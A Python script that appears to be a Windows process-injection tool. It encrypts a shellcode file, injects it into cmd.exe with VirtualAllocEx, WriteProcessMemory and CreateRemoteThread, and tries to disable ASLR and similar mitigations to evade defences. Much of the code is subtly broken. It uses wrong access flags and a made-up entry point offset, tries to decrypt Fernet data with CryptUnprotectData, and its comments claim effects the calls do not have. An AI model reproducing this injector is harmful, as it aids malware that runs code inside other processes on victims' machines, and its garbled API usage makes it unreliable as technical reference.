import psutil
import subprocess
from cryptography.fernet import Fernet
from ctypes import *
import ctypes
import sys

# Constants used for disabling ASLR
PROCESS_CREATION_DONT_RANDOMIZE = 0x00002000
PROCESS_CREATE_FLAGS = 0x08000000


with open("calc.bin", "rb") as f:
    payload = f.read()


# Encrypt the payload using Fernet
key = Fernet.generate_key()
f = Fernet(key)
encrypted_payload = f.encrypt(payload)

# Find the process to inject the payload into
process_name = "cmd.exe"
for proc in psutil.process_iter():
    if proc.name() == process_name:
        target_process = proc
        break
else:
    # If the process is not running, create a new instance
    target_process = subprocess.Popen(process_name)

# Allocate memory in the target process to store the encrypted payload
# process_handle = windll.kernel32.OpenProcess(0x1F0FFF, False, target_process.pid)
process_handle = windll.kernel32.OpenProcess(PROCESS_CREATE_FLAGS, False, target_process.pid)
memory_allocation = windll.kernel32.VirtualAllocEx(process_handle, None, len(encrypted_payload), 0x3000, 0x04)

# Disable ASLR in the target process
class PROCESS_CREATION_MITIGATION_POLICY(Structure):
    _fields_ = [("Policy", c_uint),
                ("Flags", c_uint),
                ("PolicyValue", POINTER(c_void_p)),
                ("PolicyValueSize", c_ulong)]
                
PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 0x20009
PROCESS_CREATION_MITIGATION_POLICY_DEP_ENABLE = 0x1
PROCESS_CREATION_MITIGATION_POLICY_DEP_ATL_THUNK_ENABLE = 0x2
PROCESS_CREATION_MITIGATION_POLICY_SEHOP_ENABLE = 0x4
PROCESS_CREATION_MITIGATION_POLICY_FORCE_RELOCATE_IMAGES_ALWAYS_ON = 0x8
PROCESS_CREATION_MITIGATION_POLICY_HEAP_TERMINATE_ALWAYS_ON = 0x10
PROCESS_CREATION_MITIGATION_POLICY_BOTTOM_UP_ASLR_ALWAYS_ON = 0x20
PROCESS_CREATION_MITIGATION_POLICY_HIGH_ENTROPY_ASLR_ALWAYS_ON = 0x40
PROCESS_CREATION_MITIGATION_POLICY_EXTENSION_POINT_DISABLE_ALWAYS_ON = 0x80
PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON = 0x100
PROCESS_CREATION_MITIGATION_POLICY_CONTROL_FLOW_GUARD_ALWAYS_ON = 0x200
PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x400
PROCESS_CREATION_MITIGATION_POLICY_IMAGE_LOAD_NO_REMOTE_ALWAYS_ON = 0x800
PROCESS_CREATION_MITIGATION_POLICY_IMAGE_LOAD_NO_LOW_LABEL_ALWAYS_ON = 0x1000
PROCESS_CREATION_MITIGATION_POLICY_IMAGE_LOAD_PREFER_SYSTEM32_ALWAYS_ON = 0x2000
PROCESS_CREATION_MITIGATION_POLICY_RETURN_FLOW_GUARD_ALWAYS_ON = 0x4000

PROCESS_CREATION_DONT_RANDOMIZE = PROCESS_CREATION_MITIGATION_POLICY(PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
                                                                    0,
                                                                    byref(c_void_p(PROCESS_CREATION_MITIGATION_POLICY_BOTTOM_UP_ASLR_ALWAYS_ON)),
                                                                    sizeof(c_void_p))

ctypes.windll.kernel32.SetProcessMitigationPolicy(0x3, ctypes.byref(PROCESS_CREATION_DONT_RANDOMIZE), ctypes.sizeof(PROCESS_CREATION_DONT_RANDOMIZE))


# Write the encrypted payload to the allocated memory
windll.kernel32.WriteProcessMemory(process_handle, memory_allocation, encrypted_payload, len(encrypted_payload), None)

# Calculate the address of the entry point in the loaded module
loaded_module = windll.kernel32.LoadLibraryA("kernel32.dll")
entry_point_address = windll.kernel32.GetProcAddress(loaded_module, "LoadLibraryA") + 5

# Create a remote thread in the target process to execute the entry point
windll.kernel32.CreateRemoteThread(process_handle, None, 0, entry_point_address, memory_allocation, 0, None)

# Decrypt the payload in the target process
decrypted_payload_address = windll.kernel32.VirtualAllocEx(process_handle, None, len(payload), 0x3000, 0x04)
decryption_key_address = windll.kernel32.VirtualAllocEx(process_handle, None, len(key), 0x3000, 0x04)
windll.kernel32.WriteProcessMemory(process_handle, decryption_key_address, key, len(key), None)
decryption_function_address = windll.kernel32.GetProcAddress(loaded_module, "CryptUnprotectData")

# Create a remote thread in the target process to decrypt the payload
windll.kernel32.CreateRemoteThread(process_handle, None, 0, decryption_function_address, decryption_key_address, decrypted_payload_address, None)

# Execute the decrypted payload
ctypes.windll.kernel32.VirtualProtectEx(process_handle, decrypted_payload_address, len(payload), 0x40, byref(c_ulong()))
ctypes.windll.kernel32.WriteProcessMemory(process_handle, decrypted_payload_address, payload, len(payload), None)
ctypes.windll.kernel32.CreateRemoteThread(process_handle, None, 0, decrypted_payload_address, None, 0, None)